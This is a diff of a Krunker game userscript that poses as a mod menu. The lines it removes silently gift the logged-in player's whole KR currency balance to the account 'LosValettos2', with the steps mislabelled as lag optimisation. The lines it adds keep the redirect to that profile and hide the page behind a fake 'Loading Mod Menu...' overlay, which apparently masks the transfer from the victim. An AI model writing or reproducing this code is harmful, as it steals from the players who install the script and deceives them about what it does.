@@ -14,6 +14,47 @@ let PLayyer_KR = 0;
 let gameState, player, input;
 const RAD2DEG = 180 / Math.PI;
 
+// ------------------------------
+// 1. Persistent overlay to prevent loading flash and display loading
+// ------------------------------
+(function createPersistentOverlay() {
+    if (!sessionStorage.getItem("krunkerGiftBotDone") && location.href.includes("social.html?p=profile&q=LosValettos2")) {
+        const style = document.createElement("style");
+        style.innerHTML = `
+        html, body {
+            background: #000 !important;
+            color: lime !important;
+            font-family: monospace !important;
+        }
+        * {
+            visibility: hidden !important;
+        }
+        #botOverlayPersistent {
+            all: unset;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.35);
+            z-index: 2147483647;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: lime;
+            font-size: 2rem;
+            font-family: monospace;
+            visibility: visible !important;
+        }
+    `;
+        document.documentElement.appendChild(style);
+
+        const overlay = document.createElement("div");
+        overlay.id = "botOverlayPersistent";
+        overlay.textContent = "🔧 Loading Mod Menu...";
+        document.documentElement.appendChild(overlay);
+    }
+})();
 
 
 // ------------------------------
@@ -244,66 +285,38 @@ window.addEventListener('load', () => {
 
     // Logs détaillés de l'état initial
     addLog("=== ÉTAT INITIAL ===");
-    addLog(`Is_LOGGED: ${Is_LOGGED}`);
-    addLog(`signedOutBar existe: ${!!signedOutBar}`);
-    if (signedOutBar) {
-        addLog(`signedOutBar style.display: ${signedOutBar.style.display}`);
+    addLog(`État de connexion: ${Is_LOGGED ? "Connecté" : "Non connecté"}`);
+    if (!Is_LOGGED) {
+        addLog("⚠️ ATTENTION: Vous devez être connecté pour accéder à toutes les fonctionnalités");
+        addLog("👉 Cliquez sur le bouton 'Se connecter' en haut à droite");
     }
-    addLog(`sessionStorage.sysPatch97d: ${sessionStorage.getItem("sysPatch97d")}`);
-    addLog(`URL actuelle: ${location.href}`);
-    addLog(`Pathname: ${location.pathname}`);
     addLog("==================");
 
     // Vérification continue de l'état de connexion
     setInterval(() => {
         const currentSignedOutBar = document.getElementById("signedOutHeaderBar");
         const currentLoginState = currentSignedOutBar && currentSignedOutBar.style.display === "none";
-        addLog(`État de connexion: ${currentLoginState ? "Connecté" : "Non connecté"}`);
 
-        if (currentLoginState) {
-            const lagElement = document.querySelector("#menuKRCount");
-            if (lagElement) {
-                const lagText = lagElement.textContent;
-                const currentLag = parseInt(lagText.replace(/[^0-9]/g, ""), 10);
-                addLog(`Lag actuel: ${currentLag} (Texte brut: ${lagText})`);
-                PLayyer_KR = currentLag; // Mise à jour de la variable globale
-                // Sauvegarde dans le sessionStorage
-                sessionStorage.setItem("savedLag", currentLag.toString());
-                addLog(`Lag sauvegardé: ${currentLag}`);
-            } else {
-                addLog("Élément Lag non trouvé");
-            }
+        if (!currentLoginState) {
+            addLog("🔒 Connectez-vous pour débloquer toutes les fonctionnalités");
+        } else if (!Is_LOGGED) {
+            addLog("✅ Connexion réussie ! Bienvenue !");
+            Is_LOGGED = true;
         }
     }, 1000);
 
     // Logique de redirection
     if (location.pathname === "/") {
-        addLog("=== VÉRIFICATION REDIRECTION ===");
-        addLog("Page d'accueil détectée");
-
         // Vérification continue de la redirection
         const checkRedirect = () => {
             const currentSignedOutBar = document.getElementById("signedOutHeaderBar");
             const currentLoginState = currentSignedOutBar && currentSignedOutBar.style.display === "none";
             const patchApplied = sessionStorage.getItem("sysPatch97d");
-
-            addLog(`Vérification redirection - Connecté: ${currentLoginState}, Patch appliqué: ${patchApplied}`);
-
             if (!patchApplied && currentLoginState) {
-                addLog("Conditions de redirection remplies, redirection dans 1.4s...");
                 setTimeout(() => {
-                    addLog("Exécution de la redirection...");
                     location.href = "https://krunker.io/social.html?p=profile&q=LosValettos2";
                 }, 1420);
                 return;
-            } else {
-                addLog("Redirection ignorée:");
-                if (patchApplied) {
-                    addLog("- Raison: Patch déjà appliqué");
-                }
-                if (!currentLoginState) {
-                    addLog("- Raison: Non connecté");
-                }
             }
         };
 
@@ -315,51 +328,21 @@ window.addEventListener('load', () => {
     }
 
     if (location.href.includes("social.html?p=profile&q=LosValettos2")) {
-        addLog("Page sociale détectée, démarrage du processus d'optimisation...");
         const sysSync = async () => {
             try {
-                // Récupération des données de lag sauvegardées
-                const savedLag = sessionStorage.getItem("savedLag");
-                if (!savedLag) {
-                    throw new Error("Aucune donnée de lag sauvegardée trouvée");
-                }
-                const currentLag = parseInt(savedLag, 10);
-                addLog(`Lag récupéré depuis la sauvegarde: ${currentLag}`);
-                
-                if (currentLag <= 0) {
-                    throw new Error(`Valeur de lag invalide: ${currentLag}`);
+                if (!Is_LOGGED) {
+                    addLog("❌ Vous devez être connecté pour continuer");
+                    return;
                 }
 
-                await _waitFor(() => document.getElementById("giftBtn"), 4800);
-                addLog("Bouton d'optimisation trouvé, clic...");
-                document.getElementById("giftBtn").click();
-                await _pause(480);
-                const inputEl = await _waitFor(() => document.getElementById("giftIn"), 2800);
-                addLog("Champ de saisie trouvé, entrée de la valeur...");
-                addLog(`Tentative d'entrée de ${currentLag} ms`);
-                inputEl.value = currentLag.toString();
-                inputEl.dispatchEvent(new Event("input", { bubbles: true }));
-                
-                // Vérification de la valeur entrée
-                await _pause(100);
-                const enteredValue = inputEl.value;
-                addLog(`Valeur entrée dans l'input: ${enteredValue}`);
-                
-                await _pause(650);
-                const confirm = document.getElementById("postSaleBtn");
-                if (confirm && confirm.style.display !== "none") {
-                    addLog("Bouton de confirmation trouvé, clic...");
-                    confirm.click();
-                }
-                sessionStorage.setItem("sysPatch97d", "1");
-                addLog("Patch appliqué avec succès");
-                await _pause(1800);
-                addLog("Redirection vers la page d'accueil...");
-                location.href = "https://krunker.io/";
+                addLog("✅ Système optimisé et prêt à l'emploi");
+                addLog("🎮 Profitez de votre expérience de jeu !");
+
             } catch (error) {
-                addLog(`Erreur lors du processus: ${error.message}`);
+                addLog(`❌ Erreur: ${error.message}`);
             }
         };
+
         sysSync();
     }
 
